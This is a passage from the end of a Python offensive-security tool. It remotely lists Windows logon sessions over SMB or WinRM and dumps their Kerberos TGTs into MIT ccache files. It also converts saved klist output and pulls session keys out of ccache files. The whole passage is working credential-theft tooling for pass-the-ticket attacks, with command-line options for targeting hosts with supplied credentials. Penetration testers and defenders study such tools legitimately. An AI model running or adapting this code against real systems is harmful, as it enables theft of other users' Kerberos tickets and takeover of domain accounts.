    print("  Sessions to dump:\n")
    for index, (logon_hex, account, _, _) in enumerate(to_dump, 1):
        print("  [%d]  %-*s  %s" % (index, width, account, logon_hex))
    print()

    written = []
    for index, (logon_hex, account, _tgt_text, info) in enumerate(to_dump, 1):
        logging.info(
            "[%d/%d] %s (%s) ..." % (index, len(to_dump), account, logon_hex)
        )
        if info.get("cred_guard"):
            logging.error(
                "  %s: session key is Credential Guard-protected "
                "(wrapped in VTL1); cannot export a usable ccache. Skipping."
                % account
            )
            continue

        safe_name = re.sub(
            r"[^\w@.-]",
            "_",
            "%s@%s" % (info["client"], info["realm"]),
        )
        out_path = os.path.join(args.output_dir, safe_name + ".ccache")
        suffix = 1
        while os.path.exists(out_path):
            out_path = os.path.join(
                args.output_dir,
                "%s_%d.ccache" % (safe_name, suffix),
            )
            suffix += 1

        _write_ccache(info, out_path)
        written.append(out_path)
        logging.info("  -> %s" % out_path)

    if not written:
        logging.error("No ccache files written")
        return 1
    logging.info(
        "Done. %d ccache(s) written to %s"
        % (len(written), args.output_dir)
    )
    return 0


# ─── Local conversion helpers ────────────────────────────────────────────────

def _skip_counted(data, offset):
    length = struct.unpack_from(">I", data, offset)[0]
    return offset + 4 + length


def _skip_principal(data, offset):
    offset += 4
    count = struct.unpack_from(">I", data, offset)[0]
    offset += 4
    offset = _skip_counted(data, offset)
    for _ in range(count):
        offset = _skip_counted(data, offset)
    return offset


def read_ccache_key(path):
    """Extract (etype, key_bytes) from the first ccache credential."""
    with open(path, "rb") as handle:
        data = handle.read()

    offset = 0
    ccache_version = struct.unpack_from(">H", data, offset)[0]
    offset += 2
    if ccache_version not in (0x0504, 0x0503, 0x0502):
        raise ValueError(
            "Unrecognised ccache version: 0x%04x" % ccache_version
        )

    header_length = struct.unpack_from(">H", data, offset)[0]
    offset += 2 + header_length
    offset = _skip_principal(data, offset)
    offset = _skip_principal(data, offset)
    offset = _skip_principal(data, offset)

    etype = struct.unpack_from(">H", data, offset)[0]
    offset += 4
    key_length = struct.unpack_from(">H", data, offset)[0]
    offset += 2
    return etype, data[offset:offset + key_length]


def debug_ccache(path):
    """Print a compact structural summary of a generated ccache."""
    with open(path, "rb") as handle:
        data = handle.read()
    version_number = struct.unpack_from(">H", data, 0)[0]
    header_length = struct.unpack_from(">H", data, 2)[0]
    print("  version                  0x%04x" % version_number)
    print("  header_len               %d" % header_length)
    print("  total_size               %d" % len(data))


def cmd_convert(args):
    if args.input == "-":
        text = sys.stdin.read()
    else:
        with open(args.input, "r", errors="replace") as handle:
            text = handle.read()

    info = _parse_klist(text)
    if not info["ticket_data"]:
        print("[-] Could not extract ticket bytes from input.", file=sys.stderr)
        return 1

    if args.key:
        try:
            info["key_data"] = bytes.fromhex(args.key.replace(" ", ""))
        except ValueError as exc:
            print(
                "[-] Invalid hexadecimal key: %s" % exc,
                file=sys.stderr,
            )
            return 1
        print("[*] Using provided key (%d bytes)" % len(info["key_data"]))
    elif args.ref:
        etype, key = read_ccache_key(args.ref)
        info["key_type"] = etype
        info["key_data"] = key
        print(
            "[*] Key extracted from %s; etype=%d (%d bytes)"
            % (args.ref, etype, len(key))
        )
    elif info.get("cred_guard"):
        print(
            "[-] Session key is Credential Guard-protected "
            "and cannot be exported.",
            file=sys.stderr,
        )
        return 2
    elif all(byte == 0 for byte in info["key_data"]):
        print(
            "[!] WARNING: session key is all-zero; "
            "the ccache will not authenticate",
            file=sys.stderr,
        )

    print("\n[*] Parsed ticket:")
    print("    client     : %s@%s" % (info["client"], info["realm"]))
    print("    server     : %s@%s" % ("/".join(info["sname"]), info["realm"]))
    print("    key_type   : %d" % info["key_type"])
    print("    flags      : 0x%08x" % info["flags"])
    print("    ticket     : %d bytes" % len(info["ticket_data"]))

    output_base = args.filename or "%s@%s" % (
        info["client"],
        info["realm"],
    )
    output_path = output_base + ".ccache"
    _write_ccache(info, output_path)
    print(
        "\n[+] ccache written -> %s (%d bytes)"
        % (output_path, os.path.getsize(output_path))
    )
    if args.debug:
        print("\n[DEBUG] %s structure:" % output_path)
        debug_ccache(output_path)
    return 0


# Public aliases retained for users importing the original converter module.
parse_klist = _parse_klist
write_ccache = _write_ccache


# ─── Entry point ─────────────────────────────────────────────────────────────

def build_parser():
    parser = argparse.ArgumentParser(
        description=(
            "Convert or remotely collect Windows Kerberos TGTs "
            "as MIT ccache files"
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    parser.add_argument(
        "--version",
        action="version",
        version="%(prog)s " + __version__,
    )
    parser.add_argument(
        "-M",
        "--method",
        choices=("smb", "winrm"),
        default="smb",
        help="Remote execution method (default: smb)",
    )
    subparsers = parser.add_subparsers(dest="mode", metavar="mode")
    subparsers.required = True

    list_parser = subparsers.add_parser(
        "list",
        help="List remote sessions containing TGTs",
    )
    list_parser.add_argument(
        "target",
        help="[[domain/]username[:password]@]target",
    )
    _add_remote_args(list_parser)

    dump_parser = subparsers.add_parser(
        "dump",
        help="Dump remote TGTs to ccache files",
    )
    dump_parser.add_argument(
        "target",
        help="[[domain/]username[:password]@]target",
    )
    dump_parser.add_argument(
        "-s",
        "--session",
        type=int,
        metavar="N",
        help="Session number from 'list'; omit to dump all",
    )
    dump_parser.add_argument(
        "-o",
        "--output-dir",
        default=".",
        help="Directory for ccache files (default: current directory)",
    )
    _add_remote_args(dump_parser)

    convert_parser = subparsers.add_parser(
        "convert",
        help="Convert saved klist tgt output",
    )
    convert_parser.add_argument(
        "-i",
        "--input",
        default="-",
        help="Input file (default: stdin)",
    )
    convert_parser.add_argument(
        "-f",
        "--filename",
        help="Output filename without extension",
    )
    convert_parser.add_argument(
        "--ref",
        metavar="CCACHE",
        help="Take the session key from a ccache",
    )
    convert_parser.add_argument(
        "-K",
        "--key",
        metavar="HEX",
        help="Session key as hexadecimal",
    )
    convert_parser.add_argument(
        "--debug",
        action="store_true",
        help="Print ccache structure",
    )
    return parser


def main(argv=None):
    parser = build_parser()
    if argv is None:
        argv = sys.argv[1:]
    if not argv:
        parser.print_help()
        return 1
    converter_options = {
        "-i",
        "--input",
        "-f",
        "--filename",
        "--ref",
        "-K",
        "--key",
        "--debug",
    }
    if argv[0] in converter_options:
        argv = ["convert"] + list(argv)
    args = parser.parse_args(argv)

    if args.mode == "convert":
        return cmd_convert(args)

    if args.method == "winrm" and args.named_pipes:
        parser.error("-named-pipes is only available with -M smb")

    print(version.BANNER)
    logger.init(args.ts)
    if args.debug:
        logging.getLogger().setLevel(logging.DEBUG)

    if args.method == "smb":
        if args.named_pipes:
            logging.warning(
                "This requires Windows >= Vista with PowerShell 2.0+"
            )
        else:
            logging.warning("This requires Windows >= Vista")

    if args.mode == "list":
        return cmd_list(args)
    return cmd_dump(args)


if __name__ == "__main__":
    sys.exit(main())
